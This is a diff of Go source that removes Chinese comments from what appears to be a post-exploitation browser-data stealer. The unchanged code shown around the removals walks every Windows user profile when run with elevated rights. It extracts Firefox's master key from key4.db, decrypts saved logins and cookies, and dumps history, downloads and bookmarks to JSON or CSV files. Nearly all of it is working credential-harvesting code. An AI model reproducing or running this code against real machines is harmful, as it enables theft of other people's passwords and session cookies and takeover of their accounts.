@@ -14,12 +14,10 @@ import (
 	"strings"
 )
 
-// Firefox 相关常量
 var (
 	ErrProfilePathNotFound = errors.New("profile path not found")
 )
 
-// FirefoxProfile 表示一个 Firefox 配置文件
 type FirefoxProfile struct {
 	name        string
 	profilePath string
@@ -27,7 +25,6 @@ type FirefoxProfile struct {
 	itemPaths   map[string]string
 }
 
-// GetFirefox 获取 Firefox 浏览器数据
 func GetFirefox() (string, error) {
 	var resultBuilder strings.Builder
 	var name = []string{"Firefox", ""}
@@ -37,7 +34,7 @@ func GetFirefox() (string, error) {
 	}
 
 	if IsHighIntegrity() {
-		// 高权限模式，可以访问所有用户
+
 		userFolder := fmt.Sprintf("%s\\Users\\", os.Getenv("SystemDrive"))
 		dirs, err := filepath.Glob(filepath.Join(userFolder, "*"))
 		if err != nil {
@@ -45,16 +42,14 @@ func GetFirefox() (string, error) {
 		}
 
 		for _, dir := range dirs {
-			// 跳过系统目录
+
 			if strings.Contains(dir, "All Users") || strings.Contains(dir, "Public") || strings.Contains(dir, "Default") {
 				continue
 			}
 
-			// 获取用户名
 			parts := strings.Split(dir, "\\")
 			userName := parts[len(parts)-1]
 
-			// 构建 Firefox 配置文件路径
 			firefoxProfilePath := fmt.Sprintf("%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles", dir)
 			profiles, err := getFirefoxProfiles(firefoxProfilePath)
 			if err != nil || len(profiles) == 0 {
@@ -70,35 +65,30 @@ func GetFirefox() (string, error) {
 				resultBuilder.WriteString(profileInfo)
 				PrintSuccess(fmt.Sprintf("Profile: %s", profile.name), 1)
 
-				// 提取登录数据
 				if PathExists(profile.itemPaths["logins.json"]) && PathExists(profile.itemPaths["key4.db"]) {
 					PrintVerbose(fmt.Sprintf("Get %s Login Data", name[0]))
 					loginResult, _ := FirefoxLogins(profile, name[0])
 					resultBuilder.WriteString(loginResult)
 				}
 
-				// 提取书签
 				if PathExists(profile.itemPaths["places.sqlite"]) {
 					PrintVerbose(fmt.Sprintf("Get %s Bookmarks", name[0]))
 					bookmarkResult, _ := FirefoxBookmarks(profile, name[0])
 					resultBuilder.WriteString(bookmarkResult)
 				}
 
-				// 提取Cookie
 				if PathExists(profile.itemPaths["cookies.sqlite"]) && PathExists(profile.itemPaths["key4.db"]) {
 					PrintVerbose(fmt.Sprintf("Get %s Cookie", name[0]))
 					cookieResult, _ := FirefoxCookies(profile, name[0])
 					resultBuilder.WriteString(cookieResult)
 				}
 
-				// 提取历史记录
 				if PathExists(profile.itemPaths["places.sqlite"]) {
 					PrintVerbose(fmt.Sprintf("Get %s History", name[0]))
 					historyResult, _ := FirefoxHistory(profile, name[0])
 					resultBuilder.WriteString(historyResult)
 				}
 
-				// 提取下载记录
 				if PathExists(profile.itemPaths["places.sqlite"]) {
 					PrintVerbose(fmt.Sprintf("Get %s Downloads", name[0]))
 					downloadResult, _ := FirefoxDownloads(profile, name[0])
@@ -107,7 +97,7 @@ func GetFirefox() (string, error) {
 			}
 		}
 	} else {
-		// 普通权限模式，只能访问当前用户
+
 		firefoxProfilePath := fmt.Sprintf("%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles", os.Getenv("USERPROFILE"))
 		profiles, err := getFirefoxProfiles(firefoxProfilePath)
 		if err != nil || len(profiles) == 0 {
@@ -123,35 +113,30 @@ func GetFirefox() (string, error) {
 			resultBuilder.WriteString(profileInfo)
 			PrintSuccess(fmt.Sprintf("Profile: %s", profile.name), 1)
 
-			// 提取登录数据
 			if PathExists(profile.itemPaths["logins.json"]) && PathExists(profile.itemPaths["key4.db"]) {
 				PrintVerbose(fmt.Sprintf("Get %s Login Data", name[0]))
 				loginResult, _ := FirefoxLogins(profile, name[0])
 				resultBuilder.WriteString(loginResult)
 			}
 
-			// 提取书签
 			if PathExists(profile.itemPaths["places.sqlite"]) {
 				PrintVerbose(fmt.Sprintf("Get %s Bookmarks", name[0]))
 				bookmarkResult, _ := FirefoxBookmarks(profile, name[0])
 				resultBuilder.WriteString(bookmarkResult)
 			}
 
-			// 提取Cookie
 			if PathExists(profile.itemPaths["cookies.sqlite"]) && PathExists(profile.itemPaths["key4.db"]) {
 				PrintVerbose(fmt.Sprintf("Get %s Cookie", name[0]))
 				cookieResult, _ := FirefoxCookies(profile, name[0])
 				resultBuilder.WriteString(cookieResult)
 			}
 
-			// 提取历史记录
 			if PathExists(profile.itemPaths["places.sqlite"]) {
 				PrintVerbose(fmt.Sprintf("Get %s History", name[0]))
 				historyResult, _ := FirefoxHistory(profile, name[0])
 				resultBuilder.WriteString(historyResult)
 			}
 
-			// 提取下载记录
 			if PathExists(profile.itemPaths["places.sqlite"]) {
 				PrintVerbose(fmt.Sprintf("Get %s Downloads", name[0]))
 				downloadResult, _ := FirefoxDownloads(profile, name[0])
@@ -163,7 +148,6 @@ func GetFirefox() (string, error) {
 	return resultBuilder.String(), nil
 }
 
-// getFirefoxProfiles 获取所有 Firefox 配置文件
 func getFirefoxProfiles(profilesPath string) ([]FirefoxProfile, error) {
 	if !PathExists(profilesPath) {
 		return nil, ErrProfilePathNotFound
@@ -171,21 +155,19 @@ func getFirefoxProfiles(profilesPath string) ([]FirefoxProfile, error) {
 
 	var profiles []FirefoxProfile
 
-	// 遍历配置文件目录
 	err := filepath.Walk(profilesPath, func(path string, info os.FileInfo, err error) error {
 		if err != nil {
 			return err
 		}
 
 		if info.IsDir() && strings.Contains(info.Name(), ".default") {
-			// 找到默认配置文件
+
 			profile := FirefoxProfile{
 				name:        info.Name(),
 				profilePath: path,
 				itemPaths:   make(map[string]string),
 			}
 
-			// 设置各种数据文件路径
 			profile.itemPaths["key4.db"] = filepath.Join(path, "key4.db")
 			profile.itemPaths["logins.json"] = filepath.Join(path, "logins.json")
 			profile.itemPaths["cookies.sqlite"] = filepath.Join(path, "cookies.sqlite")
@@ -204,7 +186,6 @@ func getFirefoxProfiles(profilesPath string) ([]FirefoxProfile, error) {
 	return profiles, nil
 }
 
-// GetFirefoxMasterKey 从 key4.db 获取 Firefox 主密钥
 func GetFirefoxMasterKey(profile FirefoxProfile) ([]byte, error) {
 	keyDbPath := profile.itemPaths["key4.db"]
 	tempFilename, err := CreateTmpFile(keyDbPath)
@@ -214,22 +195,18 @@ func GetFirefoxMasterKey(profile FirefoxProfile) ([]byte, error) {
 	}
 	defer RemoveFile(tempFilename)
 
-	// 使用 SQLiteHandler 打开数据库
 	sqlDatabase, err := NewSQLiteHandler(tempFilename)
 	if err != nil {
 		return nil, fmt.Errorf("open key4.db error: %w", err)
 	}
 	defer sqlDatabase.Close()
 
-	// 查询元数据
 	var metaItem1, metaItem2 []byte
 
-	// 使用 ReadTable 读取 metaData 表
 	if !sqlDatabase.ReadTable("metaData") {
 		return nil, fmt.Errorf("read metaData table error")
 	}
 
-	// 查找 password 记录
 	for i := 0; i < sqlDatabase.GetRowCount(); i++ {
 		id := sqlDatabase.GetValue(i, "id")
 		if id == "password" {
@@ -254,15 +231,12 @@ func GetFirefoxMasterKey(profile FirefoxProfile) ([]byte, error) {
 		return nil, fmt.Errorf("password record not found in metaData")
 	}
 
-	// 查询 NSS 私钥
 	var nssA11, nssA102 []byte
 
-	// 使用 ReadTable 读取 nssPrivate 表
 	if !sqlDatabase.ReadTable("nssPrivate") {
 		return nil, fmt.Errorf("read nssPrivate table error")
 	}
 
-	// 获取第一行数据
 	if sqlDatabase.GetRowCount() > 0 {
 		a11Base64 := sqlDatabase.GetValue(0, "a11")
 		a102Base64 := sqlDatabase.GetValue(0, "a102")
@@ -281,49 +255,41 @@ func GetFirefoxMasterKey(profile FirefoxProfile) ([]byte, error) {
 		return nil, fmt.Errorf("no records in nssPrivate table")
 	}
 
-	// 处理主密钥
 	return processFirefoxMasterKey(metaItem1, metaItem2, nssA11, nssA102)
 }
 
-// processFirefoxMasterKey 处理 Firefox 主密钥
 func processFirefoxMasterKey(metaItem1, metaItem2, nssA11, nssA102 []byte) ([]byte, error) {
-	// 创建 ASN1PBE 对象
+
 	metaPBE, err := NewASN1PBE(metaItem2)
 	if err != nil {
 		return nil, fmt.Errorf("error creating ASN1PBE from metaItem2: %w", err)
 	}
 
-	// 解密标志
 	flag, err := metaPBE.Decrypt(metaItem1)
 	if err != nil {
 		return nil, fmt.Errorf("error decrypting master key: %w", err)
 	}
 
-	// 验证标志
 	const passwordCheck = "password-check"
 	if !bytes.Contains(flag, []byte(passwordCheck)) {
 		return nil, errors.New("flag verification failed: password-check not found")
 	}
 
-	// 验证 nssA102
 	keyLin := []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}
 	if !bytes.Equal(nssA102, keyLin) {
 		return nil, errors.New("master key verification failed: nssA102 not equal to expected value")
 	}
 
-	// 创建 NSS ASN1PBE 对象
 	nssA11PBE, err := NewASN1PBE(nssA11)
 	if err != nil {
 		return nil, fmt.Errorf("error creating ASN1PBE from nssA11: %w", err)
 	}
 
-	// 解密最终密钥
 	finallyKey, err := nssA11PBE.Decrypt(metaItem1)
 	if err != nil {
 		return nil, fmt.Errorf("error decrypting final key: %w", err)
 	}
 
-	// 验证密钥长度
 	if len(finallyKey) < 24 {
 		return nil, errors.New("length of final key is less than 24 bytes")
 	}
@@ -331,20 +297,17 @@ func processFirefoxMasterKey(metaItem1, metaItem2, nssA11, nssA102 []byte) ([]by
 	return finallyKey[:24], nil
 }
 
-// FirefoxLogins 提取 Firefox 登录数据
 func FirefoxLogins(profile FirefoxProfile, browserName string) (string, error) {
 	var resultBuilder strings.Builder
 	header := []string{"URL", "USERNAME", "PASSWORD", "CreateDate"}
 	data := [][]string{}
 
-	// 获取主密钥
 	masterKey, err := GetFirefoxMasterKey(profile)
 	if err != nil {
 		PrintFail(fmt.Sprintf("获取主密钥失败: %v", err), 1)
 		return "", err
 	}
 
-	// 读取登录数据
 	loginsPath := profile.itemPaths["logins.json"]
 	loginsData, err := ioutil.ReadFile(loginsPath)
 	if err != nil {
@@ -352,14 +315,12 @@ func FirefoxLogins(profile FirefoxProfile, browserName string) (string, error) {
 		return "", err
 	}
 
-	// 解析 JSON
 	var loginsJSON map[string]interface{}
 	if err := jsonpkg.Unmarshal(loginsData, &loginsJSON); err != nil {
 		PrintFail(fmt.Sprintf("解析登录数据失败: %v", err), 1)
 		return "", err
 	}
 
-	// 提取登录信息
 	if logins, ok := loginsJSON["logins"].([]interface{}); ok {
 		for _, login := range logins {
 			loginMap, ok := login.(map[string]interface{})
@@ -371,9 +332,8 @@ func FirefoxLogins(profile FirefoxProfile, browserName string) (string, error) {
 			username := loginMap["encryptedUsername"].(string)
 			password := loginMap["encryptedPassword"].(string)
 			timeCreated := int64(loginMap["timeCreated"].(float64))
-			timeCreatedStr := TimeEpoch(timeCreated / 1000).String() // 转换为秒
+			timeCreatedStr := TimeEpoch(timeCreated / 1000).String()
 
-			// 解密用户名
 			decodedUsername, err := base64.StdEncoding.DecodeString(username)
 			if err != nil {
 				continue
@@ -383,7 +343,6 @@ func FirefoxLogins(profile FirefoxProfile, browserName string) (string, error) {
 				continue
 			}
 
-			// 解密密码
 			decodedPassword, err := base64.StdEncoding.DecodeString(password)
 			if err != nil {
 				continue
@@ -410,10 +369,9 @@ func FirefoxLogins(profile FirefoxProfile, browserName string) (string, error) {
 		}
 	}
 
-	// 根据格式写入文件
 	if Format == "json" || Format == "csv" {
 		fileName := filepath.Join(OutputDir, browserName+"_login")
-		// 确保输出目录存在
+
 		if err := os.MkdirAll(OutputDir, 0755); err != nil {
 			return resultBuilder.String(), err
 		}
@@ -432,7 +390,6 @@ func FirefoxLogins(profile FirefoxProfile, browserName string) (string, error) {
 	return resultBuilder.String(), nil
 }
 
-// decryptFirefoxData 解密 Firefox 加密数据
 func decryptFirefoxData(encryptedData, key []byte) (string, error) {
 	enPBE, err := NewASN1PBE(encryptedData)
 	if err != nil {
@@ -446,7 +403,6 @@ func decryptFirefoxData(encryptedData, key []byte) (string, error) {
 	return string(user), nil
 }
 
-// FirefoxCookies 提取 Firefox Cookie 数据
 func FirefoxCookies(profile FirefoxProfile, browserName string) (string, error) {
 	var resultBuilder strings.Builder
 	cookiePath := profile.itemPaths["cookies.sqlite"]
@@ -457,14 +413,12 @@ func FirefoxCookies(profile FirefoxProfile, browserName string) (string, error) 
 	}
 	defer RemoveFile(tempFilename)
 
-	// 获取主密钥
 	masterKey, err := GetFirefoxMasterKey(profile)
 	if err != nil {
 		PrintFail(fmt.Sprintf("获取主密钥失败: %v", err), 1)
 		return "", err
 	}
 
-	// 打开数据库
 	sqlDatabase, err := NewSQLiteHandler(tempFilename)
 	if err != nil {
 		PrintFail(fmt.Sprintf("打开 Cookie 数据库失败: %v", err), 1)
@@ -472,20 +426,17 @@ func FirefoxCookies(profile FirefoxProfile, browserName string) (string, error) 
 	}
 	defer sqlDatabase.Close()
 
-	// 准备数据结构
 	jsonHeader := []string{"domain", "expirationDate", "hostOnly", "httpOnly", "name", "path", "sameSite", "secure", "session", "storeId", "value"}
 	jsonData := [][]string{}
 
 	header := []string{"HOST", "COOKIE", "Path", "IsSecure", "Is_httponly", "HasExpire", "IsPersistent", "CreateDate", "ExpireDate", "AccessDate"}
 	data := [][]string{}
 
-	// 读取 moz_cookies 表
 	if !sqlDatabase.ReadTable("moz_cookies") {
 		PrintFail("没有找到 Cookie 数据", 1)
 		return "", fmt.Errorf("no cookie data found")
 	}
 
-	// 处理每一行
 	for i := 0; i < sqlDatabase.GetRowCount(); i++ {
 		host := sqlDatabase.GetValue(i, "host")
 		name := sqlDatabase.GetValue(i, "name")
@@ -498,17 +449,14 @@ func FirefoxCookies(profile FirefoxProfile, browserName string) (string, error) 
 		creationTimeStr := sqlDatabase.GetValue(i, "creationTime")
 		lastAccessedStr := sqlDatabase.GetValue(i, "lastAccessed")
 
-		// 转换时间戳
 		expiry, _ := strconv.ParseInt(expiryStr, 10, 64)
 		creationTime, _ := strconv.ParseInt(creationTimeStr, 10, 64)
 		lastAccessed, _ := strconv.ParseInt(lastAccessedStr, 10, 64)
 
-		// 转换为秒
 		creationTimeStr = TimeEpoch(creationTime / 1000000).String()
 		expiryTimeStr := TimeEpoch(expiry).String()
 		lastAccessedStr = TimeEpoch(lastAccessed / 1000000).String()
 
-		// 转换布尔值
 		hasExpires := "true"
 		isPersistent := "true"
 		if expiry == 0 {
@@ -516,7 +464,6 @@ func FirefoxCookies(profile FirefoxProfile, browserName string) (string, error) 
 			isPersistent = "false"
 		}
 
-		// 如果值是加密的，尝试解密
 		if strings.HasPrefix(value, "v10") || strings.HasPrefix(value, "v11") {
 			decodedValue, err := base64.StdEncoding.DecodeString(value)
 			if err == nil {
@@ -557,10 +504,9 @@ func FirefoxCookies(profile FirefoxProfile, browserName string) (string, error) 
 		})
 	}
 
-	// 根据格式写入文件
 	if Format == "json" || Format == "csv" {
 		fileName := filepath.Join(OutputDir, browserName+"_cookie")
-		// 确保输出目录存在
+
 		if err := os.MkdirAll(OutputDir, 0755); err != nil {
 			return resultBuilder.String(), err
 		}
@@ -579,7 +525,6 @@ func FirefoxCookies(profile FirefoxProfile, browserName string) (string, error) 
 	return resultBuilder.String(), nil
 }
 
-// FirefoxHistory 提取 Firefox 历史记录
 func FirefoxHistory(profile FirefoxProfile, browserName string) (string, error) {
 	var resultBuilder strings.Builder
 	header := []string{"URL", "TITLE", "AccessDate"}
@@ -593,7 +538,6 @@ func FirefoxHistory(profile FirefoxProfile, browserName string) (string, error) 
 	}
 	defer RemoveFile(tempFilename)
 
-	// 使用 SQLiteHandler 打开数据库
 	sqlDatabase, err := NewSQLiteHandler(tempFilename)
 	if err != nil {
 		PrintFail(fmt.Sprintf("打开历史记录数据库失败: %v", err), 1)
@@ -601,15 +545,11 @@ func FirefoxHistory(profile FirefoxProfile, browserName string) (string, error) 
 	}
 	defer sqlDatabase.Close()
 
-	// 由于 SQLiteHandler 不支持复杂 JOIN 查询，我们需要分别读取两个表并在内存中关联数据
-
-	// 首先读取 moz_places 表
 	if !sqlDatabase.ReadTable("moz_places") {
 		PrintFail("没有找到历史记录数据", 1)
 		return "", fmt.Errorf("no history data found")
 	}
 
-	// 创建 ID 到 URL 和标题的映射
 	placeMap := make(map[string]struct {
 		url   string
 		title string
@@ -626,13 +566,11 @@ func FirefoxHistory(profile FirefoxProfile, browserName string) (string, error) 
 		}{url, title}
 	}
 
-	// 然后读取 moz_historyvisits 表
 	if !sqlDatabase.ReadTable("moz_historyvisits") {
 		PrintFail("没有找到访问历史数据", 1)
 		return "", fmt.Errorf("no visit history data found")
 	}
 
-	// 处理每一行
 	for i := 0; i < sqlDatabase.GetRowCount(); i++ {
 		placeId := sqlDatabase.GetValue(i, "place_id")
 		visitDateStr := sqlDatabase.GetValue(i, "visit_date")
@@ -659,10 +597,9 @@ func FirefoxHistory(profile FirefoxProfile, browserName string) (string, error) 
 		data = append(data, []string{place.url, place.title, visitDateStr})
 	}
 
-	// 根据格式写入文件
 	if Format == "json" || Format == "csv" {
 		fileName := filepath.Join(OutputDir, browserName+"_history")
-		// 确保输出目录存在
+
 		if err := os.MkdirAll(OutputDir, 0755); err != nil {
 			return resultBuilder.String(), err
 		}
@@ -681,7 +618,6 @@ func FirefoxHistory(profile FirefoxProfile, browserName string) (string, error) 
 	return resultBuilder.String(), nil
 }
 
-// FirefoxDownloads 提取 Firefox 下载记录
 func FirefoxDownloads(profile FirefoxProfile, browserName string) (string, error) {
 	var resultBuilder strings.Builder
 	header := []string{"URL", "PATH", "TIME"}
@@ -695,7 +631,6 @@ func FirefoxDownloads(profile FirefoxProfile, browserName string) (string, error
 	}
 	defer RemoveFile(tempFilename)
 
-	// 使用 SQLiteHandler 打开数据库
 	sqlDatabase, err := NewSQLiteHandler(tempFilename)
 	if err != nil {
 		PrintFail(fmt.Sprintf("打开下载记录数据库失败: %v", err), 1)
@@ -703,7 +638,6 @@ func FirefoxDownloads(profile FirefoxProfile, browserName string) (string, error
 	}
 	defer sqlDatabase.Close()
 
-	// 首先获取 downloads/destinationFileURI 的 anno_attribute_id
 	var annoAttributeId string
 	if !sqlDatabase.ReadTable("moz_anno_attributes") {
 		PrintFail("没有找到属性数据", 1)
@@ -723,13 +657,11 @@ func FirefoxDownloads(profile FirefoxProfile, browserName string) (string, error
 		return "", fmt.Errorf("download attribute ID not found")
 	}
 
-	// 读取 moz_annos 表
 	if !sqlDatabase.ReadTable("moz_annos") {
 		PrintFail("没有找到注释数据", 1)
 		return "", fmt.Errorf("no annotation data found")
 	}
 
-	// 创建 place_id 到 content 和 dateAdded 的映射
 	annoMap := make(map[string]struct {
 		content   string
 		dateAdded string
@@ -749,13 +681,11 @@ func FirefoxDownloads(profile FirefoxProfile, browserName string) (string, error
 		}
 	}
 
-	// 读取 moz_places 表获取 URL
 	if !sqlDatabase.ReadTable("moz_places") {
 		PrintFail("没有找到地址数据", 1)
 		return "", fmt.Errorf("no places data found")
 	}
 
-	// 处理每一行
 	for i := 0; i < sqlDatabase.GetRowCount(); i++ {
 		id := sqlDatabase.GetValue(i, "id")
 		url := sqlDatabase.GetValue(i, "url")
@@ -765,11 +695,9 @@ func FirefoxDownloads(profile FirefoxProfile, browserName string) (string, error
 			continue
 		}
 
-		// 处理文件路径
 		path := strings.Replace(anno.content, "file:///", "", 1)
 		path = strings.Replace(path, "/", "\\", -1)
 
-		// 转换时间戳 (微秒转秒)
 		dateAdded, _ := strconv.ParseInt(anno.dateAdded, 10, 64)
 		dateAddedStr := TimeEpoch(dateAdded / 1000000).String()
 
@@ -787,10 +715,9 @@ func FirefoxDownloads(profile FirefoxProfile, browserName string) (string, error
 		data = append(data, []string{url, path, dateAddedStr})
 	}
 
-	// 根据格式写入文件
 	if Format == "json" || Format == "csv" {
 		fileName := filepath.Join(OutputDir, browserName+"_download")
-		// 确保输出目录存在
+
 		if err := os.MkdirAll(OutputDir, 0755); err != nil {
 			return resultBuilder.String(), err
 		}
@@ -809,7 +736,6 @@ func FirefoxDownloads(profile FirefoxProfile, browserName string) (string, error
 	return resultBuilder.String(), nil
 }
 
-// FirefoxBookmarks 提取 Firefox 书签
 func FirefoxBookmarks(profile FirefoxProfile, browserName string) (string, error) {
 	var resultBuilder strings.Builder
 	header := []string{"NAME", "URL"}
@@ -823,7 +749,6 @@ func FirefoxBookmarks(profile FirefoxProfile, browserName string) (string, error
 	}
 	defer RemoveFile(tempFilename)
 
-	// 打开数据库
 	db, err := sql.Open("sqlite", tempFilename)
 	if err != nil {
 		PrintFail(fmt.Sprintf("打开书签数据库失败: %v", err), 1)
@@ -831,7 +756,6 @@ func FirefoxBookmarks(profile FirefoxProfile, browserName string) (string, error
 	}
 	defer db.Close()
 
-	// 查询书签
 	rows, err := db.Query(`SELECT b.title, p.url, b.parent 
                           FROM moz_bookmarks b 
                           JOIN moz_places p ON b.fk = p.id 
@@ -842,7 +766,6 @@ func FirefoxBookmarks(profile FirefoxProfile, browserName string) (string, error
 	}
 	defer rows.Close()
 
-	// 处理每一行
 	for rows.Next() {
 		var title, url string
 		var parent int
@@ -851,7 +774,6 @@ func FirefoxBookmarks(profile FirefoxProfile, browserName string) (string, error
 			continue
 		}
 
-		// 获取书签文件夹路径
 		folderPath, err := getBookmarkFolderPath(db, parent)
 		if err != nil {
 			folderPath = "未知文件夹"
@@ -871,10 +793,9 @@ func FirefoxBookmarks(profile FirefoxProfile, browserName string) (string, error
 		data = append(data, []string{title, url})
 	}
 
-	// 根据格式写入文件
 	if Format == "json" || Format == "csv" {
 		fileName := filepath.Join(OutputDir, browserName+"_bookmark")
-		// 确保输出目录存在
+
 		if err := os.MkdirAll(OutputDir, 0755); err != nil {
 			return resultBuilder.String(), err
 		}
@@ -893,7 +814,6 @@ func FirefoxBookmarks(profile FirefoxProfile, browserName string) (string, error
 	return resultBuilder.String(), nil
 }
 
-// getBookmarkFolderPath 获取书签文件夹路径
 func getBookmarkFolderPath(db *sql.DB, parentID int) (string, error) {
 	var path []string
 	currentID := parentID
